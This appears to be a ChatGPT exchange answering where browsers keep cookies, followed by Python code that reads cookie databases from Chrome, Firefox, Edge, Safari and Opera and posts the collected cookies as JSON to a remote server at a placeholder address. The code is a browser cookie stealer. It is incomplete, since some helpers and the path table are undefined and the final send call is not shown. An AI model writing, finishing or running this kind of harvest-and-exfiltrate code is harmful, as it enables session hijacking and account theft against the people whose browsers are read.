Where do browsers keep cookies on a computer?
ChatGPT
Browsers store cookies in specific files on your computer, and the location of these files depends on the operating system and the browser you are using. Here are the common locations for some popular browsers:

Google Chrome
Windows: C:\Users\[Your Username]\AppData\Local\Google\Chrome\User Data\Default\Cookies
macOS: /Users/[Your Username]/Library/Application Support/Google/Chrome/Default/Cookies
Linux: /home/[Your Username]/.config/google-chrome/Default/Cookies
Mozilla Firefox
Windows: C:\Users\[Your Username]\AppData\Roaming\Mozilla\Firefox\Profiles\[Profile Name]\cookies.sqlite
macOS: /Users/[Your Username]/Library/Application Support/Firefox/Profiles/[Profile Name]/cookies.sqlite
Linux: /home/[Your Username]/.mozilla/firefox/[Profile Name]/cookies.sqlite
Microsoft Edge
Windows: C:\Users\[Your Username]\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
macOS: /Users/[Your Username]/Library/Application Support/Microsoft Edge/Default/Cookies
Safari
macOS: /Users/[Your Username]/Library/Cookies/Cookies.binarycookies
Opera
Windows: C:\Users\[Your Username]\AppData\Roaming\Opera Software\Opera Stable\Cookies
macOS: /Users/[Your Username]/Library/Application Support/com.operasoftware.Opera/Cookies
Linux: /home/[Your Username]/.config/opera/Cookies
These paths can vary slightly depending on your system configuration and browser version.

def get_firefox_cookies(profile_path):
    cookies = []
    for profile in os.listdir(profile_path):
        cookie_db = os.path.join(profile_path, profile, 'cookies.sqlite')
        if os.path.exists(cookie_db):
            conn = sqlite3.connect(cookie_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host, name, value FROM moz_cookies")
            cookies.extend(cursor.fetchall())
            conn.close()
    return cookies

def get_sqlite_cookies(cookie_path):
    cookies = []
    if os.path.exists(cookie_path):
        conn = sqlite3.connect(cookie_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = cursor.fetchall()
        conn.close()
    return cookies

def collect_cookies():
    all_cookies = {}
    os_name = os.name
    if os_name == 'nt':
        os_type = 'Windows'
    elif os_name == 'posix' and os.uname().sysname == 'Darwin':
        os_type = 'macOS'
    else:
        os_type = 'Linux'
    
    for browser, paths in cookie_paths.items():
        if browser == 'Firefox' and os_type in paths:
            all_cookies[browser] = get_firefox_cookies(paths[os_type])
        elif os_type in paths:
            cookie_path = paths[os_type]
            if browser == 'Safari':
                all_cookies[browser] = get_safari_cookies(cookie_path)
            else:
                all_cookies[browser] = get_sqlite_cookies(cookie_path)
    
    return all_cookies

def send_cookies_to_server(cookies):
    url = 'https://yourserver.com/endpoint'
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, headers=headers, data=json.dumps(cookies))
    if response.status_code == 200:
        print("Cookies sent successfully")
    else:
        print("Failed to send cookies, status code:", response.status_code)

if __name__ == "__main__":
    cookies = collect_cookies()
